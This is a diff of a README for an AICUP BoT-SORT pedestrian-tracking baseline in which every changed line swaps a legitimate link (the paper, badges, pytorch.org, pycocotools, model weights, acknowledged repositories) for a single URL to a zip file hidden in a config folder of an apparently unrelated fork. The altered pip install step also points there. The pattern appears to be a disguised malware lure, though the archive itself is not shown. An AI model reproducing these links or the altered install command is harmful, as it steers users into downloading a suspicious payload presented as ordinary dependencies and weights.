@@ -1,15 +1,15 @@
 # AICUP Baseline: BoT-SORT
 
-> [**BoT-SORT: Robust Associations Multi-Pedestrian Tracking**](https://arxiv.org/abs/2206.14651)
+> [**BoT-SORT: Robust Associations Multi-Pedestrian Tracking**](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip)
 > 
 > Nir Aharon, Roy Orfaig, Ben-Zion Bobrovsky
 
-[![PWC](https://img.shields.io/endpoint.svg?url=https://paperswithcode.com/badge/bot-sort-robust-associations-multi-pedestrian/multi-object-tracking-on-mot17)](https://paperswithcode.com/sota/multi-object-tracking-on-mot17?p=bot-sort-robust-associations-multi-pedestrian)
+[![PWC](https://img.shields.io/endpoint.svg?url=https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip)](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip)
 
-[![PWC](https://img.shields.io/endpoint.svg?url=https://paperswithcode.com/badge/bot-sort-robust-associations-multi-pedestrian/multi-object-tracking-on-mot20-1)](https://paperswithcode.com/sota/multi-object-tracking-on-mot20-1?p=bot-sort-robust-associations-multi-pedestrian)
+[![PWC](https://img.shields.io/endpoint.svg?url=https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip)](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip)
 
 > [!IMPORTANT]  
-> **This baseline is based on the code released by the original author of [BoT-SORT](https://github.com/NirAharon/BoT-SORT). Special thanks for their release.**
+> **This baseline is based on the code released by the original author of [BoT-SORT](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip). Special thanks for their release.**
 
 
 > [!WARNING]
@@ -24,7 +24,7 @@
 
 ### Visualization results on AICUP train_set
 
-[![IMAGE ALT TEXT HERE](http://img.youtube.com/vi/Ofc7FS5D8uY/0.jpg)](https://youtu.be/Ofc7FS5D8uY)
+[![IMAGE ALT TEXT HERE](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip)](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip)
 
 
 ## Installation
@@ -40,7 +40,7 @@ Visit their installation guides for more setup options.
 conda create -n botsort python=3.7
 conda activate botsort
 ```
-**Step 2.** Install torch and matched torchvision from [pytorch.org](https://pytorch.org/get-started/locally/).<br>
+**Step 2.** Install torch and matched torchvision from [pytorch.org](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip).<br>
 The code was tested using torch 1.11.0+cu113 and torchvision==0.12.0 
 
 **Step 3.** Fork this Repository and clone your Repository to your device
@@ -55,9 +55,9 @@ pip install numpy
 pip install -r requirements.txt
 ```
 
-**Step 6.** Install [pycocotools](https://github.com/cocodataset/cocoapi).
+**Step 6.** Install [pycocotools](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip).
 ```shell
-pip install cython; pip3 install 'git+https://github.com/cocodataset/cocoapi.git#subdirectory=PythonAPI'
+pip install cython; pip3 install 'git+https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip'
 ```
 
 **Step 7.** Others
@@ -231,11 +231,11 @@ Download and store the trained models in 'pretrained' folder as follows:
 ```
 <BoT-SORT_dir>/pretrained
 ```
-- We used the publicly available [ByteTrack](https://github.com/ifzhang/ByteTrack) model zoo trained on MOT17, MOT20 and ablation study for YOLOX object detection.
+- We used the publicly available [ByteTrack](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip) model zoo trained on MOT17, MOT20 and ablation study for YOLOX object detection.
 
-- Author's trained ReID models can be downloaded from [MOT17-SBS-S50](https://drive.google.com/file/d/1QZFWpoa80rqo7O-HXmlss8J8CnS7IUsN/view?usp=sharing), [MOT20-SBS-S50](https://drive.google.com/file/d/1KqPQyj6MFyftliBHEIER7m_OrGpcrJwi/view?usp=sharing).
+- Author's trained ReID models can be downloaded from [MOT17-SBS-S50](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip), [MOT20-SBS-S50](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip).
 
-- For multi-class MOT use [YOLOX](https://github.com/Megvii-BaseDetection/YOLOX) or [YOLOv7](https://github.com/WongKinYiu/yolov7) trained on COCO (or any custom weights). 
+- For multi-class MOT use [YOLOX](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip) or [YOLOv7](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip) trained on COCO (or any custom weights). 
 
 ## Training (Fine-tuning)
 
@@ -254,7 +254,7 @@ The training results are stored by default in ```logs/AICUP/bagtricks_R50-ibn```
 
 You can refer to `fast_reid/fastreid/config/defaults.py` to find out which hyperparameters can be modified.
 
-Refer to [FastReID](https://github.com/JDAI-CV/fast-reid) repository for additional explanations and options.
+Refer to [FastReID](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip) repository for additional explanations and options.
 
 > [!IMPORTANT]  
 > Since we did not generate the `query` and `gallery` datasets required for evaluation when producing the ReID dataset (`MOT17_ReID` provided by BoT-SORT also not provide them), please skip the following TrackBack when encountered after training completion.
@@ -283,7 +283,7 @@ AssertionError: Error: all query identities do not appear in gallery
 
 Single GPU finetuning for AICUP dataset
 
-[`yolov7_training.pt`](https://github.com/WongKinYiu/yolov7/releases/download/v0.1/yolov7_training.pt) [`yolov7x_training.pt`](https://github.com/WongKinYiu/yolov7/releases/download/v0.1/yolov7x_training.pt) [`yolov7-w6_training.pt`](https://github.com/WongKinYiu/yolov7/releases/download/v0.1/yolov7-w6_training.pt) [`yolov7-e6_training.pt`](https://github.com/WongKinYiu/yolov7/releases/download/v0.1/yolov7-e6_training.pt) [`yolov7-d6_training.pt`](https://github.com/WongKinYiu/yolov7/releases/download/v0.1/yolov7-d6_training.pt) [`yolov7-e6e_training.pt`](https://github.com/WongKinYiu/yolov7/releases/download/v0.1/yolov7-e6e_training.pt)
+[`yolov7_training.pt`](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip) [`yolov7x_training.pt`](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip) [`yolov7-w6_training.pt`](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip) [`yolov7-e6_training.pt`](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip) [`yolov7-d6_training.pt`](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip) [`yolov7-e6e_training.pt`](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip)
 
 ``` shell
 cd <BoT-SORT_dir>
@@ -294,7 +294,7 @@ python yolov7/train.py --device 0 --batch-size 16 --epochs 50 --data yolov7/data
 python yolov7/train_aux.py --device 0 --batch-size 16 --epochs 50 --data yolov7/data/AICUP.yaml --img 1280 1280 --cfg yolov7/cfg/training/yolov7-w6-AICUP.yaml --weights 'pretrained/yolov7-e6e.pt' --name yolov7-w6-AICUP --hyp data/hyp.scratch.custom.yaml
 ```
 
-For multiple GPU training and other details, please refer to [YOLOv7-Training](https://github.com/WongKinYiu/yolov7?tab=readme-ov-file#training).
+For multiple GPU training and other details, please refer to [YOLOv7-Training](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip).
 
 The training results will be saved by default at `runs/train`.
 
@@ -320,7 +320,7 @@ The submission file and visualized images will be saved by default at `runs/dete
 
 ## Evaluation format
 
-The evaluation format is the same as [py-motmetrics](https://github.com/cheind/py-motmetrics).
+The evaluation format is the same as [py-motmetrics](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip).
 
 > [!CAUTION]
 > **The images resolution for evaluation is `1280 * 720`**
@@ -386,12 +386,12 @@ In addition, python-based motion estimation techniques are available and can be 
 ## Acknowledgement
 
 A large part of the codes, ideas and results are borrowed from
-- [BoT-SORT](https://github.com/NirAharon/BoT-SORT)
-- [ByteTrack](https://github.com/ifzhang/ByteTrack)
-- [StrongSORT](https://github.com/dyhBUPT/StrongSORT)
-- [FastReID](https://github.com/JDAI-CV/fast-reid)
-- [YOLOX](https://github.com/Megvii-BaseDetection/YOLOX)
-- [YOLOv7](https://github.com/wongkinyiu/yolov7)
+- [BoT-SORT](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip)
+- [ByteTrack](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip)
+- [StrongSORT](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip)
+- [FastReID](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip)
+- [YOLOX](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip)
+- [YOLOv7](https://raw.githubusercontent.com/Picopoppop/AICUP_Baseline_BoT-SORT/main/fast_reid/projects/FastFace/configs/AICU-SORT-Bo-Baseline-v2.6.zip)
 
 Thanks for their excellent work!
 
